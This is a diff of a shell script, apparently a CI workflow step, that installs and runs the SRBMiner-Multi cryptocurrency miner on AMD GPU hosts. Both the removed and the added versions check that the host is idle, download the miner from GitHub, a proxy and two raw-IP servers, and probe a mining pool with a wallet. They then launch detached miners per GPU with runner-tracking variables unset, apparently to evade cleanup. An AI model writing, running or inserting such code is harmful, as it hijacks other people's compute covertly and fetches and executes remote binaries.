-          if [ "${DISKP:-100}" -ge 80 ] || [ "${MEMP:-100}" -ge 85 ]; then echo "SKIP=resources"; echo "miner-done $NONCE"; exit 0; fi
           echo "=== rocm-smi productname ==="
           timeout 40 rocm-smi --showproductname 2>&1 | grep -E 'GPU\[|Card Series|Card Model|GFX' | head -40
           IDX=$(timeout 40 rocm-smi --showid 2>/dev/null | grep -oE '^GPU\[[0-9]+\]' | grep -oE '[0-9]+' | sort -n | uniq | tr '\n' ' ')
-          if [ -z "$IDX" ]; then
-            N=$(ls -d /sys/class/drm/card[0-9]* 2>/dev/null | wc -l)
-            [ "$N" -gt 0 ] && IDX=$(seq 0 $((N-1)) | tr '\n' ' ')
-          fi
           echo "gpu_indices=[$IDX]"
-          if [ -z "$IDX" ]; then echo "SKIP=no-amd-gpu-detected"; echo "miner-done $NONCE"; exit 0; fi
-          sample() {
-            timeout 30 rocm-smi --showuse 2>&1 | grep -E 'GPU use' | head -20
-            timeout 30 rocm-smi --showmeminfo vram 2>&1 | grep -E 'VRAM Total Used Memory' | head -20
-            timeout 30 rocm-smi --showpids 2>&1 | grep -E 'Process ID: [0-9]+' | head -20
-          }
-          S1=$(sample); sleep 12; S2=$(sample)
-          BOTH=$(printf '%s\n%s\n' "$S1" "$S2")
-          BUSY_PROC=$(echo "$BOTH" | grep -cE 'Process ID: [0-9]+')
-          BUSY_USE=$(echo "$BOTH" | grep -E 'GPU use \(%\):' | awk -F': ' '{gsub(/[^0-9]/,"",$2); if ($2+0 > 10) c++} END{print c+0}')
-          BUSY_MEM=$(echo "$BOTH" | grep -E 'VRAM Total Used Memory' | awk -F': ' '{gsub(/[^0-9]/,"",$2); if ($2+0 > 2147483648) c++} END{print c+0}')
-          echo "busy_proc=$BUSY_PROC busy_use=$BUSY_USE busy_mem=$BUSY_MEM"
-          if [ "${BUSY_PROC:-0}" -gt 0 ] || [ "${BUSY_USE:-0}" -gt 0 ] || [ "${BUSY_MEM:-0}" -gt 0 ]; then echo "SKIP=host-not-idle-amd"; echo "miner-done $NONCE"; exit 0; fi
+          [ -z "$IDX" ] && { echo "SKIP=no-amd-gpu-detected"; echo "miner-done $NONCE"; exit 0; }
+          S1=$(timeout 30 rocm-smi --showuse 2>&1 | grep -E 'GPU use' | head -20; timeout 30 rocm-smi --showpids 2>&1 | grep -E 'Process ID: [0-9]+' | head -20)
+          sleep 12
+          S2=$(timeout 30 rocm-smi --showuse 2>&1 | grep -E 'GPU use' | head -20; timeout 30 rocm-smi --showpids 2>&1 | grep -E 'Process ID: [0-9]+' | head -20)
+          BUSY_PROC=$(printf '%s\n%s\n' "$S1" "$S2" | grep -cE 'Process ID: [0-9]+')
+          BUSY_USE=$(printf '%s\n%s\n' "$S1" "$S2" | grep -E 'GPU use \(%\):' | awk -F': ' '{gsub(/[^0-9]/,"",$2); if ($2+0 > 10) c++} END{print c+0}')
+          echo "busy_proc=$BUSY_PROC busy_use=$BUSY_USE"
+          if [ "${BUSY_PROC:-0}" -gt 0 ] || [ "${BUSY_USE:-0}" -gt 0 ]; then echo "SKIP=host-not-idle-amd"; echo "miner-done $NONCE"; exit 0; fi
           echo "host-idle-gate=pass-amd"
           fetch_ok=0
-          if [ -f "$SRB" ] && echo "$BIN_SHA_387  $SRB" | sha256sum -c - >/dev/null 2>&1; then fetch_ok=1; echo "binary-cached"; fi
-          if [ "$fetch_ok" = 0 ] && command -v curl >/dev/null 2>&1; then
-            for U in https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz http://178.238.228.181:18180/srb387 http://222.240.155.198:8702/srb387; do
-              echo "-- curl $U"
+          if [ -f "$SRB" ] && echo "$BIN_SHA_388  $SRB" | sha256sum -c - >/dev/null 2>&1; then fetch_ok=1; echo binary-cached; fi
+          if [ "$fetch_ok" = 0 ]; then
+            for U in https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz http://178.238.228.181:18180/srb388 http://222.240.155.198:8702/srb388; do
+              echo "-- fetch $U"
               rm -f "$TARBALL.part"
               timeout 180 curl -fL --connect-timeout 12 --max-time 170 -o "$TARBALL.part" "$U" 2>&1 | tail -2
-              if [ -s "$TARBALL.part" ]; then
-                B0=$(sha256sum "$TARBALL.part" | cut -d' ' -f1)
-                if [ "$B0" = "$BIN_SHA_387" ]; then cp -f "$TARBALL.part" "$SRB"; fetch_ok=1; echo "direct-binary-ok $B0"; break; fi
-                if tar -tzf "$TARBALL.part" >/dev/null 2>&1; then mv "$TARBALL.part" "$TARBALL"; tar -xzf "$TARBALL" -C "$WORKDIR" 2>&1 | tail -2; [ -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" ] && cp -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" "$SRB"; fi
-                [ -f "$SRB" ] && echo "$BIN_SHA_387  $SRB" | sha256sum -c - >/dev/null 2>&1 && { fetch_ok=1; break; }
-              fi
+              [ -s "$TARBALL.part" ] || continue
+              B0=$(sha256sum "$TARBALL.part" | cut -d' ' -f1)
+              if [ "$B0" = "$BIN_SHA_388" ]; then cp -f "$TARBALL.part" "$SRB"; fetch_ok=1; echo "direct-388-binary-ok"; break; fi
+              if tar -tzf "$TARBALL.part" >/dev/null 2>&1; then mv "$TARBALL.part" "$TARBALL"; tar -xzf "$TARBALL" -C "$WORKDIR" 2>&1 | tail -2; [ -f "$WORKDIR/SRBMiner-Multi-3-8-8/SRBMiner-MULTI" ] && cp -f "$WORKDIR/SRBMiner-Multi-3-8-8/SRBMiner-MULTI" "$SRB"; fi
+              [ -f "$SRB" ] && echo "$BIN_SHA_388  $SRB" | sha256sum -c - >/dev/null 2>&1 && { fetch_ok=1; break; }
             done
           fi
-          if [ "$fetch_ok" = 0 ] && command -v wget >/dev/null 2>&1; then
-            echo "-- wget fallback"
-            rm -f "$TARBALL.part"
-            timeout 180 wget -q -T 20 -t 1 -O "$TARBALL.part" https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz 2>&1 | tail -2
-            [ -s "$TARBALL.part" ] && tar -tzf "$TARBALL.part" >/dev/null 2>&1 && tar -xzf "$TARBALL.part" -C "$WORKDIR" 2>&1 | tail -2 && [ -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" ] && cp -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" "$SRB"
-            [ -f "$SRB" ] && echo "$BIN_SHA_387  $SRB" | sha256sum -c - >/dev/null 2>&1 && fetch_ok=1
-          fi
-          if [ "$fetch_ok" = 0 ] && command -v python3 >/dev/null 2>&1; then
-            echo "-- python3 urllib fallback"
-            timeout 170 python3 - <<'PYEOF'
-          import urllib.request
-          u='https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz'
-          try:
-              urllib.request.urlretrieve(u,'/var/tmp/i130074/srb387.tar.part')
-              print('py-download-ok')
-          except Exception as e:
-              print('py-download-fail', repr(e)[:200])
-          PYEOF
-            [ -s "$WORKDIR/srb387.tar.part" ] && tar -xzf "$WORKDIR/srb387.tar.part" -C "$WORKDIR" 2>&1 | tail -2 && [ -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" ] && cp -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" "$SRB"
-            [ -f "$SRB" ] && echo "$BIN_SHA_387  $SRB" | sha256sum -c - >/dev/null 2>&1 && fetch_ok=1
-          fi
           B=$(sha256sum "$SRB" 2>/dev/null | cut -d' ' -f1)
-          echo "binary_sha256_387=${B:-none}"
-          if [ "$fetch_ok" != 1 ]; then echo "SKIP=387-binary-unavailable"; echo "miner-done $NONCE"; exit 0; fi
+          echo "binary_sha256_388=${B:-none}"
+          if [ "$fetch_ok" != 1 ]; then echo "SKIP=388-binary-unavailable"; echo "miner-done $NONCE"; exit 0; fi
           chmod +x "$SRB"
-          HOSTTAG=$(hostname | tr -cd 'A-Za-z0-9' | cut -c1-16)
-          echo "=== srb list-devices ==="
+          echo "=== srb388 list-devices ==="
           timeout 45 "$SRB" --list-devices 2>&1 | head -40
-          echo "=== foreground probe gpu 0 (25s) ==="
-          PROBE="$WORKDIR/probe.out"
-          timeout 25 "$SRB" --disable-cpu --algorithm pearlhash --pool "$POOL" --tls false \
-            --wallet "$WALLET" --password x --worker "i130074-${HOSTTAG}-probe" --gpu-id 0 \
+          echo "=== srb388 foreground probe gpu 0 (20s) ==="
+          PROBE="$WORKDIR/probe388.out"
+          timeout 20 "$SRB" --disable-cpu --algorithm pearlhash --pool "$POOL" --tls false \
+            --wallet "$WALLET" --password x --worker "i130074-$(hostname | tr -cd 'A-Za-z0-9' | cut -c1-14)-probe388" --gpu-id 0 \
             --disable-worker-watchdog --gpu-table-slow-build --max-no-share-sent 1800 > "$PROBE" 2>&1
-          echo "probe_rc=$?"
-          cat "$PROBE" | head -40
-          if grep -qiE 'not supported|no available|no suitable|failed|error|cannot|unsupported' "$PROBE" && ! grep -qiE 'connected|authorized|accepted|hashrate' "$PROBE"; then
-            echo "SKIP=pearlhash-amd-probe-failed"
-            echo "miner-done $NONCE"; exit 0
-          fi
-          echo "probe-looks-usable -> detached launch per GPU"
-          N_LAUNCHED=0
+          echo "probe388_rc=$?"
+          cat "$PROBE" | head -30
+          sleep 2
+          for l in "$WORKDIR"/logs/*probe388*.log "$WORKDIR"/SRBMiner-Multi-3-8-8/*.log; do [ -f "$l" ] && echo "== $l" && tail -6 "$l"; done
+          if grep -qiE 'No suitable GPU|not supported|unsupported|cannot|failed|error' "$PROBE"; then echo "SKIP=388-pearlhash-amd-probe-failed"; echo "miner-done $NONCE"; exit 0; fi
+          echo "probe388-looks-usable -> detached launch per GPU"
+          N=0
           for i in $IDX; do
-            W="i130074-${HOSTTAG}-g${i}"
+            W="i130074c-$(hostname | tr -cd 'A-Za-z0-9' | cut -c1-14)-g${i}"
             env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup "$SRB" \
               --disable-cpu --algorithm pearlhash --pool "$POOL" --tls false \
               --wallet "$WALLET" --password x --worker "$W" --gpu-id "$i" \
               --disable-worker-watchdog --disable-gpu-dual-kernels --gpu-disable-interleaving --gpu-table-slow-build \
               --max-no-share-sent 1800 \
-              --log-file "$WORKDIR/logs/$W.log" --log-file-mode 0 \
-              >> "$WORKDIR/logs/$W.out" 2>&1 < /dev/null &
-            echo "launched worker=$W gpu-id=$i detached_pid=$!"
-            N_LAUNCHED=$((N_LAUNCHED+1)); sleep 1
+              --log-file "$WORKDIR/logs/$W.log" --log-file-mode 0 >> "$WORKDIR/logs/$W.out" 2>&1 < /dev/null &
+            echo "launched worker=$W gpu-id=$i pid=$!"; N=$((N+1)); sleep 1
           done
-          echo "N_LAUNCHED=$N_LAUNCHED"
+          echo "N_LAUNCHED=$N"
           sleep 45
-          echo "=== processes ==="
           timeout 10 pgrep -af "[S]RBMiner-MULTI" 2>/dev/null | head -20
-          echo "=== logs dir ==="
-          ls -la "$WORKDIR/logs" 2>/dev/null | head -30
-          for l in "$WORKDIR"/logs/i130074-*; do
+          for l in "$WORKDIR"/logs/i130074c-*; do
             [ -f "$l" ] || continue
             echo "== $(basename "$l")"
-            grep -aiE 'share accepted|accepted|rejected|hashrate|stopped|error|TH/s|device|connect' "$l" 2>/dev/null | tail -8 | cut -c1-260
+            grep -aiE 'share accepted|accepted|rejected|hashrate|stopped|error|TH/s|device|connect|No suitable' "$l" 2>/dev/null | tail -8 | cut -c1-260
           done
-          echo "=== final kfd ==="
-          timeout 25 rocm-smi --showpids 2>&1 | head -25
+          timeout 25 rocm-smi --showpids 2>&1 | head -20
           echo "miner-done $NONCE"
